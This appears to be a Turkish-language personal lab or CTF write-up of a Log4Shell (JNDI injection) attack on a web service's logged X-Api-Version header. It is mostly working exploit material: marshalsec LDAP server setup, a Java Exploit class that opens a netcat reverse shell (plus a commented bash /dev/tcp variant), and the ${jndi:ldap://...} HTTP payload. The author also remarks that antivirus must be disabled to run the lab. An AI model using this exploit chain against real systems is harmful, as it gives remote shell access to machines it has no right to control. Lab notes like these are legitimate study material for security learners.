fuzz sonucu
![[Pasted image 20250412112710.png]]
/systeminfo
![[Pasted image 20250412115452.png]]
yeni bir davranış burada X-api-version üzerinden bir loglama gerçekleşiyor olabilir.

![[Pasted image 20250412115809.png]]


log4j üzerinde bir açık olduğunu görüyorum ora üzerine yoğunlaşıyorum
ve `/` a giderkene `X-api-version` header ı loglanıyor
bu yüzden : 
`X-api-version` header ı üzerine payload deniyorum.

Aşağıda bu açığın ne olduğu payloadın nasıl kullanıldığı anlatılıyor.
--
# JNDI Injection (Log4Shell Tarzı RCE) 


`marshalsec` kurulur : 
```bash
git clone https://github.com/mbechler/marshalsec.git
mvn clean package -DskipTests
```

```bash title:"LDAP sunucusu çalıştırılır"
java -cp target/marshalsec-*.jar marshalsec.jndi.LDAPRefServer "http://192.168.144.1:1112/#Exploit"
```
LDAP sunucusu 0.0.0.0:1389 üzerinde çalışmaya başlar web serverinin buraya istek göndermesi gerekir.
![[Pasted image 20250413035110.png]]


LDAP sunucumun yönlendirdiği `192.168.144.1:1112` üzerinde çalışan http server: alt dizininde `Exploit.class` sınıfını bulundurur. bu sınıfı aşağıdaki kod üzerinden derliyoruz.

```bash
python3 -m http.server 1112
```
```java
import java.io.IOException;
public class Exploit {
    static {
        try {
            // String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/localhost/4444 0>&1"};
            String[] cmd = {"/bin/sh", "-c", "nc 192.168.157.1 4444 -e /bin/sh"};
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
```bash
javac exploit.java
```

> [!Araştır]
> bash üzerinde çalışmadı docker içerisinde biraz kontrol ettim bash çalışmıyormuş sh çalışıyormuş 

```http
GET /api HTTP/1.1
X-Api-Version: ${jndi:ldap://192.168.144.1:1389/a}
Host: localhost:8080
```
şeklinde istek gönderildiğinde sırasıyla 

LDAP -> http.server -> nc reverse shell şeklinde bir istek gönderilir
bu şekilde reverse shell alınır

![[Pasted image 20250413035335.png]]


XD :)
![[Pasted image 20250413030555.png]] 

Bu labı windows üzerinde çözebilmek için virüsten korumayı kapatmak gerekiyor sinirleniyor.


![[Pasted image 20250413031049.png]]



